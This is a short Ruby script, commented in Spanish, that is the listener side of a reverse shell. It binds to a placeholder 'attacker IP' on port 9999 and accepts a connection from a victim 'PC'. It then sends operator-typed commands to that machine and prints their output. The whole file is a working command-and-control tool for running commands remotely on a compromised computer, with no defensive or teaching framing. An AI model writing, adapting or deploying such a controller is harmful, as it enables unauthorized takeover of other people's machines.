require 'socket'

def run_server
  laptop_ip = 'ip atacante'  # Cambia esto a la IP de tu laptop
  laptop_port = 9999

  server_socket = TCPServer.new(laptop_ip, laptop_port)
  puts "Servidor escuchando en el puerto #{laptop_port}..."

  loop do
    client_socket = server_socket.accept
    puts "Conexión aceptada de #{client_socket.peeraddr[2]}"

    # Obtener la IP del cliente (PC)
    client_ip = client_socket.recv(1024)
    puts "IP del cliente (PC): #{client_ip}"

    loop do
      print "Insertar comando > "
      command = gets.chomp
      
      if command.downcase == 'exit'
        client_socket.puts(command)
        break
      end

      # Enviar comando al cliente
      client_socket.puts(command)

      # Recibir salida completa del comando
      output = ''
      while (line = client_socket.gets) && !line.chomp.empty?
        output << line
      end
      puts "Salida del comando:\n#{output}"
    end

    client_socket.close
  end
end

if __FILE__ == $0
  run_server
end
